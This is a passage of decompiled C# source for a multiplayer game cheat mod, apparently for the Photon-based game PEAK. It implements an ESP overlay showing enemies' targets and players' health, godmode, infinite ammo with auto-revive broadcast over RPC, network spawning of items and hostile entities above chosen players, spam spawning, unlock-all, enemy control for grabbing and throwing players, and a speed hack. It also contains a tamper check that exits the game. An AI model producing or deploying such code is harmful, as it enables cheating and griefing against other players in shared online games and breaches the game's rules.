				if ((Object)(object)component.gameObject.GetComponent<Player>() != (Object)null && (Object)(object)component.photonView != (Object)null && component.photonView.Owner != null)
				{
					if (!component.photonView.IsMine)
					{
						return "Player";
					}
					return "Player (You)";
				}
				try
				{
					FieldInfo field3 = typeof(Character).GetField("isBot", BindingFlags.Instance | BindingFlags.Public);
					if (field3 != null && (bool)field3.GetValue(component))
					{
						return "Bot";
					}
				}
				catch
				{
				}
			}
			components = entity.GetComponents<MonoBehaviour>();
			foreach (MonoBehaviour val2 in components)
			{
				if (val2 == null)
				{
					continue;
				}
				string name2 = ((object)val2).GetType().Name;
				switch (name2)
				{
				case "Scoutmaster":
					return "Scoutmaster";
				case "MushroomZombie":
					return "Zombie";
				case "Beetle":
					return "Beetle";
				}
				if (name2.Contains("Scoutmaster"))
				{
					return "Scoutmaster";
				}
				if (name2.Contains("Zombie"))
				{
					return "Zombie";
				}
				if (name2.Contains("Beetle"))
				{
					return "Beetle";
				}
				if (name2.Contains("Enemy"))
				{
					return "Enemy";
				}
				if (name2.Contains("NPC"))
				{
					return "NPC";
				}
			}
			string name3 = ((Object)entity).name;
			if (name3.Contains("Scoutmaster") || name3.Contains("ScoutMaster") || name3.Contains("Scout Master"))
			{
				return "Scoutmaster";
			}
			if (name3.Contains("Zombie"))
			{
				return "Zombie";
			}
			if (name3.Contains("Beetle"))
			{
				return "Beetle";
			}
			if (name3.Contains("Enemy"))
			{
				return "Enemy";
			}
			return "Entity";
		}

		private static string GetTargetName(Character target)
		{
			if (target == null)
			{
				return "Unknown";
			}
			try
			{
				if ((Object)(object)target.photonView != (Object)null && target.photonView.Owner != null)
				{
					string text = target.photonView.Owner.NickName ?? "Unknown";
					if (text.Length > 20)
					{
						text = text.Substring(0, 20) + "...";
					}
					return text;
				}
				if ((Object)(object)target == (Object)(object)Character.localCharacter)
				{
					return "You";
				}
				FieldInfo field = typeof(Character).GetField("isBot", BindingFlags.Instance | BindingFlags.Public);
				if (field != null && (bool)field.GetValue(target))
				{
					return "Bot";
				}
				return "Unknown";
			}
			catch
			{
				return "Unknown";
			}
		}

		private static Color GetEntityColor(string entityType)
		{
			return (Color)(entityType.ToLower() switch
			{
				"zombie" => ZombieColor, 
				"scoutmaster" => ScoutmasterColor, 
				"beetle" => BeetleColor, 
				"enemy" => new Color(1f, 0.2f, 0.2f), 
				"bot" => new Color(0.5f, 0.5f, 1f), 
				_ => new Color(1f, 0.7f, 0.3f), 
			});
		}

		private static string GetItemName(Item item)
		{
			if (item == null)
			{
				return "Unknown";
			}
			try
			{
				FieldInfo field = typeof(Item).GetField("itemName", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
				if (field != null)
				{
					object value = field.GetValue(item);
					if (value != null)
					{
						return value.ToString();
					}
				}
				FieldInfo field2 = typeof(Item).GetField("displayName", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
				if (field2 != null)
				{
					object value2 = field2.GetValue(item);
					if (value2 != null)
					{
						return value2.ToString();
					}
				}
			}
			catch
			{
			}
			string text = ((Object)item).name;
			if (text.Contains("(Clone)"))
			{
				text = text.Replace("(Clone)", "");
			}
			return text;
		}

		private static Color GetItemColor(string itemName)
		{
			string text = itemName.ToLower();
			if (text.Contains("fruit") || text.Contains("apple") || text.Contains("berry") || text.Contains("banana") || text.Contains("orange"))
			{
				return new Color(1f, 0.5f, 0.5f);
			}
			if (text.Contains("gun") || text.Contains("weapon") || text.Contains("rifle") || text.Contains("pistol") || text.Contains("knife"))
			{
				return new Color(0.8f, 0.2f, 0.2f);
			}
			if (text.Contains("med") || text.Contains("health") || text.Contains("bandage") || text.Contains("heal"))
			{
				return new Color(0.2f, 1f, 0.2f);
			}
			if (text.Contains("ammo") || text.Contains("bullet") || text.Contains("magazine"))
			{
				return new Color(1f, 1f, 0.2f);
			}
			return ItemColor;
		}

		private static string GetLuggageName(GameObject luggage)
		{
			if (luggage == null)
			{
				return "Luggage";
			}
			try
			{
				if (_luggageComponentType != null)
				{
					Component component = luggage.GetComponent(_luggageComponentType);
					MonoBehaviour val = (MonoBehaviour)(object)((component is MonoBehaviour) ? component : null);
					if (val != null)
					{
						FieldInfo field = _luggageComponentType.GetField("name", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
						if (field != null)
						{
							object value = field.GetValue(val);
							if (value != null)
							{
								return value.ToString();
							}
						}
					}
				}
			}
			catch
			{
			}
			string text = ((Object)luggage).name;
			if (text.Contains("(Clone)"))
			{
				text = text.Replace("(Clone)", "");
			}
			return text;
		}

		private static float GetCharacterHealth(Character character)
		{
			if (character == null || character.data == null)
			{
				return 0f;
			}
			try
			{
				FieldInfo field = typeof(CharacterData).GetField("health", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
				if (field != null && field.GetValue(character.data) is float result)
				{
					return result;
				}
				FieldInfo field2 = typeof(CharacterData).GetField("maxHealth", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
				if (field2 != null && field2.GetValue(character.data) is float num && num > 0f)
				{
					PropertyInfo property = typeof(CharacterData).GetProperty("Health", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
					if (property != null)
					{
						object value = property.GetValue(character.data);
						if (value is float)
						{
							return (float)value / num * 100f;
						}
					}
				}
			}
			catch
			{
			}
			return 100f;
		}

		private static Color GetDistanceColor(float distance, Color baseColor)
		{
			if (distance < 20f)
			{
				return baseColor;
			}
			if (distance < 50f)
			{
				return Color.Lerp(baseColor, baseColor * 0.7f, (distance - 20f) / 30f);
			}
			if (distance < 100f)
			{
				return Color.Lerp(baseColor * 0.7f, baseColor * 0.5f, (distance - 50f) / 50f);
			}
			return baseColor * 0.5f;
		}

		private static string GetEntityAIState(GameObject entity, Character charComponent)
		{
			if (entity == null)
			{
				return "";
			}
			try
			{
				MonoBehaviour[] components = entity.GetComponents<MonoBehaviour>();
				foreach (MonoBehaviour val in components)
				{
					if (val == null)
					{
						continue;
					}
					string name = ((object)val).GetType().Name;
					if (name == "MushroomZombie")
					{
						FieldInfo field = ((object)val).GetType().GetField("_currentState", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
						if (field == null)
						{
							field = ((object)val).GetType().GetField("currentState", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
						}
						if (field != null)
						{
							object value = field.GetValue(val);
							if (value != null)
							{
								string text = value.ToString();
								FieldInfo field2 = ((object)val).GetType().GetField("_currentTarget", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
								if (field2 == null)
								{
									PropertyInfo property = ((object)val).GetType().GetProperty("currentTarget", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
									if (property != null)
									{
										object value2 = property.GetValue(val);
										Character val2 = (Character)((value2 is Character) ? value2 : null);
										if (val2 != null)
										{
											string targetName = GetTargetName(val2);
											return text + "  " + targetName;
										}
									}
								}
								else
								{
									object value3 = field2.GetValue(val);
									Character val3 = (Character)((value3 is Character) ? value3 : null);
									if (val3 != null)
									{
										string targetName2 = GetTargetName(val3);
										return text + "  " + targetName2;
									}
								}
								return text;
							}
						}
					}
					switch (name)
					{
					case "Scoutmaster":
					{
						PropertyInfo property2 = ((object)val).GetType().GetProperty("currentTarget", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
						if (property2 != null)
						{
							object value4 = property2.GetValue(val);
							Character val4 = (Character)((value4 is Character) ? value4 : null);
							if (val4 != null)
							{
								string targetName3 = GetTargetName(val4);
								FieldInfo field3 = ((object)val).GetType().GetField("isThrowing", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
								if (field3 != null && (bool)field3.GetValue(val))
								{
									return "Throwing  " + targetName3;
								}
								return "Hunting  " + targetName3;
							}
						}
						return "Patrolling";
					}
					case "Beetle":
					case "Mob":
					{
						FieldInfo field4 = ((object)val).GetType().GetField("_mobState", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
						if (field4 != null)
						{
							object value5 = field4.GetValue(val);
							if (value5 != null)
							{
								string text2 = value5.ToString();
								FieldInfo field5 = ((object)val).GetType().GetField("_targetChar", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
								if (field5 != null)
								{
									object value6 = field5.GetValue(val);
									Character val5 = (Character)((value6 is Character) ? value6 : null);
									if (val5 != null)
									{
										string targetName4 = GetTargetName(val5);
										return text2 + "  " + targetName4;
									}
								}
								return text2;
							}
						}
						if (charComponent != null && charComponent.input != null)
						{
							if (((Vector2)(ref charComponent.input.movementInput)).magnitude > 0.1f)
							{
								return "Moving";
							}
							return "Idle";
						}
						return "Active";
					}
					}
					if (!name.Contains("AI") && !name.Contains("Enemy") && !name.Contains("Behavior") && !name.Contains("StateMachine"))
					{
						continue;
					}
					PropertyInfo property3 = ((object)val).GetType().GetProperty("State", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
					if (property3 != null)
					{
						object value7 = property3.GetValue(val);
						if (value7 != null)
						{
							return value7.ToString();
						}
					}
					FieldInfo field6 = ((object)val).GetType().GetField("currentState", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
					if (field6 != null)
					{
						object value8 = field6.GetValue(val);
						if (value8 != null)
						{
							return value8.ToString();
						}
					}
				}
				if (charComponent != null && charComponent.input != null)
				{
					if (((Vector2)(ref charComponent.input.movementInput)).magnitude > 0.1f)
					{
						return "Moving";
					}
					if (charComponent.input.jumpIsPressed)
					{
						return "Jumping";
					}
					return "Idle";
				}
			}
			catch
			{
			}
			return "";
		}

		private static string FormatTime(float seconds)
		{
			if (seconds < 60f)
			{
				return $"{seconds:F0}s";
			}
			int num = Mathf.FloorToInt(seconds / 60f);
			int num2 = Mathf.FloorToInt(seconds % 60f);
			return $"{num}:{num2:D2}";
		}

		private static EnvironmentalEventInfo GetEnvironmentalEvent(GameObject obj)
		{
			if (obj == null)
			{
				return null;
			}
			MonoBehaviour[] components = obj.GetComponents<MonoBehaviour>();
			foreach (MonoBehaviour val in components)
			{
				if (val == null)
				{
					continue;
				}
				Type type = ((object)val).GetType();
				string text = type.Name.ToLower();
				if (text.Contains("wind") || text.Contains("root"))
				{
					float nextWindTime = GetNextWindTime(val);
					if (nextWindTime >= 0f)
					{
						return new EnvironmentalEventInfo
						{
							EventType = "Wind",
							NextEventTime = nextWindTime,
							Color = new Color(0.5f, 0.8f, 1f)
						};
					}
				}
				if (text.Contains("cold") || text.Contains("snow") || text.Contains("blizzard") || text.Contains("freeze"))
				{
					float nextColdStormTime = GetNextColdStormTime(val);
					if (nextColdStormTime >= 0f)
					{
						return new EnvironmentalEventInfo
						{
							EventType = "Cold Storm",
							NextEventTime = nextColdStormTime,
							Color = new Color(0.7f, 0.9f, 1f)
						};
					}
				}
				try
				{
					FieldInfo[] fields = type.GetFields(BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
					foreach (FieldInfo fieldInfo in fields)
					{
						if (!(fieldInfo.FieldType == typeof(float)))
						{
							continue;
						}
						string text2 = fieldInfo.Name.ToLower();
						if (text2.Contains("timer") || text2.Contains("next") || text2.Contains("event"))
						{
							float num = (float)fieldInfo.GetValue(val);
							if (num > Time.time)
							{
								return new EnvironmentalEventInfo
								{
									EventType = type.Name,
									NextEventTime = num,
									Color = new Color(0.8f, 0.8f, 0.8f)
								};
							}
						}
					}
				}
				catch
				{
				}
			}
			return null;
		}

		private static float GetNextWindTime(MonoBehaviour comp)
		{
			if (comp == null)
			{
				return -1f;
			}
			try
			{
				Type type = ((object)comp).GetType();
				FieldInfo field = type.GetField("nextWindTime", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
				FieldInfo field2 = type.GetField("windTimer", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
				if (field != null && field.GetValue(comp) is float result)
				{
					return result;
				}
				if (field2 != null)
				{
					object value = field2.GetValue(comp);
					if (value is float)
					{
						return Time.time + (float)value;
					}
				}
			}
			catch
			{
			}
			return -1f;
		}

		private static float GetNextColdStormTime(MonoBehaviour comp)
		{
			if (comp == null)
			{
				return -1f;
			}
			try
			{
				Type type = ((object)comp).GetType();
				FieldInfo field = type.GetField("nextColdStormTime", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
				FieldInfo field2 = type.GetField("coldTimer", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
				FieldInfo field3 = type.GetField("stormTimer", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
				if (field != null && field.GetValue(comp) is float result)
				{
					return result;
				}
				if (field2 != null)
				{
					object value = field2.GetValue(comp);
					if (value is float)
					{
						return Time.time + (float)value;
					}
				}
				if (field3 != null)
				{
					object value2 = field3.GetValue(comp);
					if (value2 is float)
					{
						return Time.time + (float)value2;
					}
				}
			}
			catch
			{
			}
			return -1f;
		}

		public static void DrawWatermark()
		{
			if (!CheatConfig.ShowWatermark)
			{
				return;
			}
			try
			{
				if (WATERMARK_TEXT != WATERMARK_CHECK || WATERMARK_TEXT.GetHashCode() != WATERMARK_HASH)
				{
					Application.Quit();
					Environment.Exit(1);
					return;
				}
			}
			catch
			{
				Application.Quit();
				Environment.Exit(1);
				return;
			}
			InitializeStyles();
			_textStyle.fontSize = 14;
			_textStyle.normal.textColor = new Color(1f, 1f, 1f, 0.7f);
			_textStyle.alignment = (TextAnchor)2;
			Vector2 val = _textStyle.CalcSize(new GUIContent(WATERMARK_TEXT));
			float num = 10f;
			GUI.Label(new Rect((float)Screen.width - val.x - 10f, num, val.x, val.y), WATERMARK_TEXT, _textStyle);
			UpdateFPS();
			string text = $"{_currentFPS} FPS";
			Vector2 val2 = _textStyle.CalcSize(new GUIContent(text));
			num += val.y + 5f;
			GUI.Label(new Rect((float)Screen.width - val2.x - 10f, num, val2.x, val2.y), text, _textStyle);
		}

		private static void UpdateFPS()
		{
			_fpsTimeLeft -= Time.deltaTime;
			_fpsAccumulator += Time.timeScale / Time.deltaTime;
			_fpsFrames++;
			if (_fpsTimeLeft <= 0f)
			{
				_currentFPS = Mathf.RoundToInt(_fpsAccumulator / (float)_fpsFrames);
				_fpsAccumulator = 0f;
				_fpsFrames = 0;
				_fpsTimeLeft = _fpsUpdateInterval;
			}
		}

		public static void DrawEntityControlKeybinds()
		{
			if (CheatConfig.CurrentlyControlledEntity == null)
			{
				return;
			}
			GameObject currentlyControlledEntity = CheatConfig.CurrentlyControlledEntity;
			if (currentlyControlledEntity == null)
			{
				return;
			}
			Character component = currentlyControlledEntity.GetComponent<Character>();
			if (component == null)
			{
				return;
			}
			bool flag = false;
			bool flag2 = false;
			MonoBehaviour[] components = currentlyControlledEntity.GetComponents<MonoBehaviour>();
			foreach (MonoBehaviour val in components)
			{
				if (val != null)
				{
					string name = ((object)val).GetType().Name;
					if (name == "MushroomZombie")
					{
						flag = true;
					}
					else if (name == "Scoutmaster")
					{
						flag2 = true;
					}
				}
			}
			if (!flag && !flag2)
			{
				return;
			}
			InitializeStyles();
			_textStyle.alignment = (TextAnchor)6;
			_textStyle.fontSize = 12;
			_textStyle.normal.textColor = Color.yellow;
			_textStyle.wordWrap = false;
			float num = Screen.height - 80;
			float num2 = 10f;
			float num3 = 20f;
			string text = (flag ? "Zombie" : "Scoutmaster");
			GUI.Label(new Rect(num2, num, 300f, num3), "Controlling: " + text, _textStyle);
			num += num3;
			if (flag)
			{
				GUI.Label(new Rect(num2, num, 300f, num3), "LMB / E - Lunge Attack", _textStyle);
				num += num3;
			}
			if (!flag2)
			{
				return;
			}
			bool flag3 = false;
			try
			{
				FieldInfo field = typeof(CharacterData).GetField("grabbedPlayer", BindingFlags.Instance | BindingFlags.NonPublic);
				if (field != null)
				{
					object value = field.GetValue(component.data);
					flag3 = (Object)((value is Character) ? value : null) != (Object)null;
				}
			}
			catch
			{
			}
			if (flag3)
			{
				GUI.Label(new Rect(num2, num, 300f, num3), "RMB / F - Throw Player", _textStyle);
			}
			else
			{
				GUI.Label(new Rect(num2, num, 300f, num3), "RMB / F - Grab Player (nearby)", _textStyle);
			}
		}
	}
	public static class FieldOfView
	{
		public static void Apply()
		{
			if (!CheatConfig.SetFieldOfView || Camera.main == null)
			{
				return;
			}
			try
			{
				Camera.main.fieldOfView = CheatConfig.FieldOfView;
			}
			catch
			{
			}
		}
	}
	public static class Godmode
	{
		public static void Apply()
		{
			if (Character.localCharacter == null || !Character.localCharacter.photonView.IsMine)
			{
				return;
			}
			if (CheatConfig.Godmode && !CheatConfig.GodmodeWasEnabled)
			{
				CheatConfig.GodmodeWasEnabled = true;
				PropertyInfo property = typeof(Character).GetProperty("infiniteStam", BindingFlags.Instance | BindingFlags.Public);
				if (property != null)
				{
					MethodInfo setMethod = property.GetSetMethod(nonPublic: true);
					if (setMethod != null)
					{
						setMethod.Invoke(Character.localCharacter, new object[1] { true });
					}
				}
				Character.localCharacter.data.currentStamina = 1f;
				Character.localCharacter.AddExtraStamina(100f);
				GUIManager.instance.bar.ChangeBar();
				StatusEffects.ClearAll();
			}
			else if (!CheatConfig.Godmode && CheatConfig.GodmodeWasEnabled)
			{
				CheatConfig.GodmodeWasEnabled = false;
				PropertyInfo property2 = typeof(Character).GetProperty("infiniteStam", BindingFlags.Instance | BindingFlags.Public);
				if (property2 != null)
				{
					MethodInfo setMethod2 = property2.GetSetMethod(nonPublic: true);
					if (setMethod2 != null)
					{
						setMethod2.Invoke(Character.localCharacter, new object[1] { false });
					}
				}
			}
			if (CheatConfig.Godmode)
			{
				Character.localCharacter.data.currentStamina = Mathf.Max(Character.localCharacter.data.currentStamina, Character.localCharacter.GetMaxStamina());
				GUIManager.instance.bar.ChangeBar();
				StatusEffects.ClearAll();
			}
		}

		public static void Disable()
		{
			CheatConfig.Godmode = false;
			CheatConfig.GodmodeWasEnabled = false;
			if (!(Character.localCharacter != null))
			{
				return;
			}
			PropertyInfo property = typeof(Character).GetProperty("infiniteStam", BindingFlags.Instance | BindingFlags.Public);
			if (property != null)
			{
				MethodInfo setMethod = property.GetSetMethod(nonPublic: true);
				if (setMethod != null)
				{
					setMethod.Invoke(Character.localCharacter, new object[1] { false });
				}
			}
		}
	}
	public static class InfiniteAmmo
	{
		private static Item _lastInfiniteAmmoItem = null;

		private static Dictionary<Item, bool> _patchedItems = new Dictionary<Item, bool>();

		private static Type _actionReduceUsesType = null;

		private static MethodInfo _originalRunActionMethod = null;

		private static Dictionary<object, Action> _originalActions = new Dictionary<object, Action>();

		public static void Apply()
		{
			if (Character.localCharacter == null)
			{
				return;
			}
			if (CheatConfig.InfiniteAmmo)
			{
				if (Character.localCharacter.data.dead || Character.localCharacter.data.fullyPassedOut)
				{
					Character.localCharacter.photonView.RPC("RPCA_Revive", RpcTarget.All, new object[1] { true });
					StatusEffects.ClearAll();
				}
				if (!(Character.localCharacter.data.currentItem != null))
				{
					return;
				}
				try
				{
					Item currentItem = Character.localCharacter.data.currentItem;
					if ((Object)(object)_lastInfiniteAmmoItem != (Object)(object)currentItem)
					{
						_lastInfiniteAmmoItem = currentItem;
						_patchedItems.Remove(currentItem);
					}
					if (!_patchedItems.ContainsKey(currentItem))
					{
						PatchReduceUses(currentItem);
						_patchedItems[currentItem] = true;
					}
					return;
				}
				catch
				{
					return;
				}
			}
			if (_lastInfiniteAmmoItem != null && _patchedItems.ContainsKey(_lastInfiniteAmmoItem))
			{
				UnpatchReduceUses(_lastInfiniteAmmoItem);
				_patchedItems.Remove(_lastInfiniteAmmoItem);
			}
		}

		private static void PatchReduceUses(Item item)
		{
			try
			{
				if (_actionReduceUsesType == null)
				{
					_actionReduceUsesType = Type.GetType("Action_ReduceUses");
					if (_actionReduceUsesType != null)
					{
						_originalRunActionMethod = _actionReduceUsesType.GetMethod("RunAction", BindingFlags.Instance | BindingFlags.Public);
					}
				}
				if (_actionReduceUsesType == null || _originalRunActionMethod == null)
				{
					return;
				}
				Component component = ((Component)item).GetComponent(_actionReduceUsesType);
				if (component == null || _originalActions.ContainsKey(component))
				{
					return;
				}
				FieldInfo field = typeof(Item).GetField("OnPrimaryFinishedCast", BindingFlags.Instance | BindingFlags.Public);
				if (!(field != null) || !(field.GetValue(item) is Action action))
				{
					return;
				}
				Delegate[] invocationList = action.GetInvocationList();
				Action action2 = null;
				Delegate[] array = invocationList;
				foreach (Delegate @delegate in array)
				{
					if (@delegate.Target == component && @delegate.Method == _originalRunActionMethod)
					{
						Action originalDelegate = (Action)@delegate;
						_originalActions[component] = originalDelegate;
						action2 = delegate
						{
							if (!CheatConfig.InfiniteAmmo)
							{
								originalDelegate();
							}
						};
					}
					else if (action2 == null)
					{
						if (@delegate is Action action3)
						{
							action2 = action3;
						}
					}
					else
					{
						action2 = (Action)Delegate.Combine(action2, @delegate as Action);
					}
				}
				if (action2 != null)
				{
					field.SetValue(item, action2);
				}
			}
			catch
			{
			}
		}

		private static void UnpatchReduceUses(Item item)
		{
			try
			{
				if (_actionReduceUsesType == null)
				{
					return;
				}
				Component component = ((Component)item).GetComponent(_actionReduceUsesType);
				if (!(component == null) && _originalActions.ContainsKey(component))
				{
					FieldInfo field = typeof(Item).GetField("OnPrimaryFinishedCast", BindingFlags.Instance | BindingFlags.Public);
					if (field != null && field.GetValue(item) is Action a && _originalActions.ContainsKey(component))
					{
						Action value = (Action)Delegate.Combine(a, _originalActions[component]);
						field.SetValue(item, value);
					}
				}
			}
			catch
			{
			}
		}
	}
	public static class ItemSpawning
	{
		public static void SpawnItem(string itemName, Character targetPlayer = null)
		{
			if (!PhotonNetwork.InRoom)
			{
				return;
			}
			try
			{
				Vector3 val = ((targetPlayer != null && targetPlayer.refs != null && targetPlayer.refs.head != null) ? (targetPlayer.refs.head.transform.position + Vector3.up * 2f) : ((!(Character.localCharacter != null) || Character.localCharacter.refs == null || !(Character.localCharacter.refs.head != null)) ? ((Camera.main != null) ? (Camera.main.transform.position + Camera.main.transform.forward * 2f) : Vector3.zero) : (Character.localCharacter.refs.head.transform.position + Vector3.up * 2f)));
				if ((Object)(object)PhotonNetwork.Instantiate(itemName, val, Quaternion.identity, (byte)0, (object[])null) != (Object)null)
				{
					Debug.Log((object)$"[ItemSpawning] Spawned {itemName} at {val}");
				}
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[ItemSpawning] Failed to spawn item " + itemName + ": " + ex.Message));
			}
		}

		public static void SpawnEntity(string entityName, Character targetPlayer = null)
		{
			if (!PhotonNetwork.InRoom)
			{
				return;
			}
			try
			{
				Vector3 val = ((targetPlayer != null && targetPlayer.refs != null && targetPlayer.refs.head != null) ? (targetPlayer.refs.head.transform.position + Vector3.up * 2f) : ((!(Character.localCharacter != null) || Character.localCharacter.refs == null || !(Character.localCharacter.refs.head != null)) ? ((Camera.main != null) ? (Camera.main.transform.position + Camera.main.transform.forward * 2f) : Vector3.zero) : (Character.localCharacter.refs.head.transform.position + Vector3.up * 2f)));
				if ((Object)(object)PhotonNetwork.Instantiate(entityName, val, Quaternion.identity, (byte)0, (object[])null) != (Object)null)
				{
					Debug.Log((object)$"[ItemSpawning] Spawned entity {entityName} at {val}");
				}
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[ItemSpawning] Failed to spawn entity " + entityName + ": " + ex.Message));
			}
		}

		public static void InitializeEntities()
		{
			if (CheatConfig.EntitiesInitialized)
			{
				return;
			}
			List<string> list = new List<string>();
			HashSet<string> hashSet = new HashSet<string>();
			try
			{
				if (PhotonNetwork.PrefabPool != null)
				{
					try
					{
						FieldInfo field = ((object)PhotonNetwork.PrefabPool).GetType().GetField("resourceCache", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
						if (field != null && field.GetValue(PhotonNetwork.PrefabPool) is Dictionary<string, GameObject> dictionary)
						{
							foreach (string key in dictionary.Keys)
							{
								if (string.IsNullOrEmpty(key))
								{
									continue;
								}
								string text = key.ToLower();
								if ((text.Contains("item") && !text.Contains("zombie") && !text.Contains("scoutmaster") && !text.Contains("beetle")) || key == "Player" || key == "Character")
								{
									continue;
								}
								GameObject val = dictionary[key];
								if (val != null)
								{
									bool flag = (Object)(object)val.GetComponent<PhotonView>() != (Object)null;
									bool flag2 = (Object)(object)val.GetComponent<Character>() != (Object)null;
									bool flag3 = (Object)(object)val.GetComponent<Item>() != (Object)null;
									if ((flag || flag2) && !flag3 && !hashSet.Contains(key))
									{
										list.Add(key);
										hashSet.Add(key);
										Debug.Log((object)("[ItemSpawning] Found entity in pool: " + key));
									}
								}
							}
						}
					}
					catch (Exception ex)
					{
						Debug.Log((object)("[ItemSpawning] Could not access PhotonNetwork prefab pool: " + ex.Message));
					}
				}
				string[] array = new string[13]
				{
					"", "0_Characters", "Characters", "Prefabs", "0_Prefabs", "Entities", "NPCs", "AI", "Enemies", "0_Entities",
					"0_NPCs", "0_AI", "0_Enemies"
				};
				foreach (string text2 in array)
				{
					try
					{
						GameObject[] array2 = Resources.LoadAll<GameObject>(text2);
						foreach (GameObject val2 in array2)
						{
							if (val2 == null)
							{
								continue;
							}
							string name = ((Object)val2).name;
							string text3 = (string.IsNullOrEmpty(text2) ? name : (text2 + "/" + name));
							if (hashSet.Contains(text3) || hashSet.Contains(name))
							{
								continue;
							}
							string text4 = name.ToLower();
							if ((!text4.Contains("item") || text4.Contains("zombie") || text4.Contains("scoutmaster") || text4.Contains("beetle")) && !(name == "Player") && !(name == "Character"))
							{
								bool flag4 = (Object)(object)val2.GetComponent<PhotonView>() != (Object)null;
								bool flag5 = (Object)(object)val2.GetComponent<Character>() != (Object)null;
								bool flag6 = (Object)(object)val2.GetComponent<Item>() != (Object)null;
								if ((flag4 || flag5) && !flag6)
								{
									list.Add(text3);
									hashSet.Add(text3);
									hashSet.Add(name);
									Debug.Log((object)("[ItemSpawning] Found entity in Resources: " + text3));
								}
							}
						}
					}
					catch (Exception ex2)
					{
						Debug.Log((object)("[ItemSpawning] Could not load prefabs from folder '" + text2 + "': " + ex2.Message));
					}
				}
				array = new string[13]
				{
					"Zombie", "Scoutmaster", "ScoutMaster", "Beetle", "0_Characters/Zombie", "0_Characters/Scoutmaster", "0_Characters/Beetle", "Characters/Zombie", "Characters/Scoutmaster", "Characters/Beetle",
					"Prefabs/Zombie", "Prefabs/Scoutmaster", "Prefabs/Beetle"
				};
				foreach (string text5 in array)
				{
					if (hashSet.Contains(text5))
					{
						continue;
					}
					try
					{
						GameObject val3 = Resources.Load<GameObject>(text5);
						if (val3 != null)
						{
							bool flag7 = (Object)(object)val3.GetComponent<Item>() != (Object)null;
							bool flag8 = (Object)(object)val3.GetComponent<PhotonView>() != (Object)null;
							bool flag9 = (Object)(object)val3.GetComponent<Character>() != (Object)null;
							if (!flag7 && (flag8 || flag9))
							{
								list.Add(text5);
								hashSet.Add(text5);
								Debug.Log((object)("[ItemSpawning] Found common entity: " + text5));
							}
						}
					}
					catch
					{
					}
				}
			}
			catch (Exception ex3)
			{
				Debug.LogError((object)("[ItemSpawning] Error discovering entities: " + ex3.Message));
			}
			List<string> list2 = new List<string>();
			HashSet<string> hashSet2 = new HashSet<string>();
			try
			{
				if (CheatConfig.Items != null && CheatConfig.Items.Length != 0)
				{
					string[] array = CheatConfig.Items;
					foreach (string text6 in array)
					{
						if (!string.IsNullOrEmpty(text6))
						{
							hashSet2.Add(text6.ToLower());
						}
					}
				}
			}
			catch
			{
			}
			foreach (string item in list)
			{
				string text7 = item.ToLower();
				bool flag10 = false;
				foreach (string item2 in hashSet2)
				{
					if (text7 == item2.ToLower() || text7.EndsWith("/" + item2.ToLower()))
					{
						flag10 = true;
						break;
					}
				}
				if (!text7.Contains("zombie") && !text7.Contains("scoutmaster") && !text7.Contains("beetle") && text7.Contains("item"))
				{
					flag10 = true;
				}
				if (!flag10)
				{
					list2.Add(item);
				}
			}
			CheatConfig.AvailableEntities = list2.ToArray();
			CheatConfig.EntitiesInitialized = true;
			Debug.Log((object)string.Format("[ItemSpawning] Discovered {0} spawnable entities: {1}...", CheatConfig.AvailableEntities.Length, string.Join(", ", CheatConfig.AvailableEntities.Take(10))));
		}

		public static string[] FilterEntities(string searchText)
		{
			if (string.IsNullOrEmpty(searchText))
			{
				return CheatConfig.AvailableEntities;
			}
			string searchLower = searchText.ToLower();
			return CheatConfig.AvailableEntities.Where((string e) => e.ToLower().Contains(searchLower)).ToArray();
		}
	}
	public static class MiscFeatures
	{
		private static CharacterCustomization _customization = null;

		private static float _cosmeticCooldown = 0.07f;

		public static void ApplyUnlockAll()
		{
			if (PassportManager.instance != null)
			{
				PassportManager.instance.testUnlockAll = CheatConfig.UnlockAll;
			}
		}

		public static void ApplyBingBongSpam()
		{
			if (CheatConfig.BingBongSpam)
			{
				PhotonNetwork.Instantiate("0_Items/BingBong", Camera.main.transform.position, Camera.main.transform.rotation, (byte)0, (object[])null);
			}
		}

		public static void ApplyClearStatuses()
		{
			if (CheatConfig.ClearStatuses && !(Character.localCharacter == null))
			{
				StatusEffects.Clear();
				CheatConfig.ClearStatuses = false;
			}
		}

		public static void ApplyRandomOutfits()
		{
			if (CheatConfig.RandomOutfits && Time.time > _cosmeticCooldown)
			{
				if (_customization == null && Character.localCharacter != null)
				{
					_customization = ((Component)Character.localCharacter).GetComponent<CharacterCustomization>();
				}
				CharacterCustomization customization = _customization;
				if (customization != null)
				{
					customization.RandomizeCosmetics();
				}
				_cosmeticCooldown = Time.time + 0.07f;
			}
		}
	}
	public static class Movement
	{
		private static bool _isFlying = false;

		private static Vector3 _flyVelocity = Vector3.zero;

		private static float _acceleration = 200f;

		public static void ApplySpeedHack()
		{
			if ((Object)(object)Character.localCharacter?.refs?.movement == (Object)null)
			{
				return;
			}
			if (CheatConfig.BaseMovementModifier <= 0.1f)
			{
				CheatConfig.BaseMovementModifier = Character.localCharacter.refs.movement.movementModifier;
